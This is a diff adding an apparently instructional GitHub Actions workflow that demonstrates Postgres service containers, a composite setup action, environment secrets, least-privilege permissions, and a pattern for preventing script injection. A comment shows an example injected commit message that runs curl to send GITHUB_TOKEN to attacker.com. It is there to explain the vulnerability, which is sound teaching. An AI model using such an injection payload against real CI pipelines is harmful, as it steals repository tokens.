@@ -1,0 +1,136 @@
+##
+## Features demo — exercises the remaining course concepts in two focused jobs.
+##
+## Concepts covered:
+##   - Service containers : real Postgres alongside the job (no mocks)
+##   - Composite action   : reuse shared setup logic via .github/actions/setup-test-env
+##   - Env vars & secrets : env: at step and job level; named environment + encrypted secret
+##   - Security           : least-privilege permissions, script-injection-safe pattern, OIDC reference
+##
+
+name: "02 · Features Demo"
+
+# Workflow-level default: limit what GITHUB_TOKEN can do.
+# Most jobs only read code — there's no reason to grant write access.
+permissions:
+  contents: read   # ← SECURITY: least-privilege default
+
+on:
+  push:
+    branches: [main]
+    paths-ignore:
+      - '**/*.md'
+      - 'docs/**'
+  workflow_dispatch:
+
+jobs:
+
+  # ─── Job 1: Integration tests against a real database ────────────────────────
+  integration:
+    name: "Integration tests (Postgres)"
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read   # explicit at job level — makes intent clear
+
+    # Service containers spin up as Docker sidecars next to the job.
+    # They're available via localhost on the mapped port.
+    services:                        # ← SERVICE CONTAINERS
+      postgres:
+        image: postgres:15
+        env:                         # env vars passed into the container at startup
+          POSTGRES_USER: testuser
+          POSTGRES_PASSWORD: testpassword
+          POSTGRES_DB: testdb
+        ports:
+          - 5432:5432                # container:runner — tests connect via localhost:5432
+        # Health check blocks the job until Postgres is accepting connections
+        options: >-
+          --health-cmd pg_isready
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+
+    steps:
+      - uses: actions/checkout@v4
+
+      # ← COMPOSITE ACTION: call the shared setup action instead of repeating
+      #   checkout / setup-node / npm install in every workflow
+      - uses: ./.github/actions/setup-test-env
+        with:
+          node-version: "20"
+
+      - name: Run integration tests
+        id: tests
+        continue-on-error: true      # upload the report first, fail the job after
+        env:                         # ← ENV VARS: inject the connection string at step level
+          DATABASE_URL: postgresql://testuser:testpassword@localhost:5432/testdb
+        run: npm run test:integration
+
+      - name: Upload test results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: integration-test-results
+          path: test-results/
+          retention-days: 14
+
+      - name: Fail if tests failed
+        if: steps.tests.outcome == 'failure'   # fail now that the report is safely uploaded
+        run: exit 1
+
+  # ─── Job 2: Security patterns ────────────────────────────────────────────────
+  security:
+    name: "Security patterns"
+    runs-on: ubuntu-latest
+
+    # Named environment: gates the job and exposes environment-scoped secrets.
+    # Create "staging" in Settings → Environments; add EXAMPLE_TOKEN as an environment secret.
+    environment: staging             # ← NAMED ENVIRONMENT
+
+    permissions:
+      contents: read   # only read access — this job doesn't push anything
+
+    steps:
+      - uses: actions/checkout@v4
+
+      # ── Pattern 1: Script injection prevention ──────────────────────────────
+      #
+      # UNSAFE — never do this in a run: step:
+      #   run: echo "Commit message: ${{ github.event.head_commit.message }}"
+      #
+      # Why: ${{ expressions }} are interpolated by GHA *before* the shell runs,
+      # so a commit message of `"; curl attacker.com?t=$GITHUB_TOKEN; echo "` would
+      # execute as shell code. Routing untrusted input through an env var fixes it.
+      - name: Script-injection-safe pattern
+        env:
+          # The expression goes into an env var — safe because GHA sets the var value,
+          # not the shell. The shell then reads $COMMIT_MSG as a plain string.
+          COMMIT_MSG: "${{ github.event.head_commit.message || github.event.inputs.ref || 'manual run' }}"
+        run: |
+          echo "Commit message: $COMMIT_MSG"   # $COMMIT_MSG cannot be executed by the shell
+
+      # ── Pattern 2: Encrypted secret from a named environment ────────────────
+      #
+      # Secrets are masked in logs — GHA replaces their value with ***.
+      # Environment secrets are scoped: only workflows targeting "staging" can read EXAMPLE_TOKEN.
+      - name: Use an environment secret
+        env:
+          TOKEN: ${{ secrets.EXAMPLE_TOKEN }}  # ← SECRET: pulled from the "staging" environment
+        run: |
+          echo "Token is set: $( [ -n "$TOKEN" ] && echo yes || echo no )"
+          # Never echo the secret value directly — GHA masks it, but it's still bad practice
+
+      # ── Pattern 3: OIDC keyless auth (reference — uncomment to use with AWS) ─
+      #
+      # Instead of storing a static AWS secret in GitHub, the runner requests a
+      # short-lived JWT from GitHub's OIDC provider. AWS verifies it and issues a
+      # temporary credential. No long-lived secret to rotate or accidentally leak.
+      #
+      # To enable: add `id-token: write` to this job's permissions block.
+      #
+      # - name: Configure AWS credentials (OIDC)
+      #   uses: aws-actions/configure-aws-credentials@v4
+      #   with:
+      #     role-to-assume: ${{ secrets.AWS_ROLE_ARN }}   # IAM role that trusts GitHub's OIDC provider
+      #     aws-region: us-east-1
+      # - run: aws s3 cp playwright-report/ s3://my-test-results/ --recursive
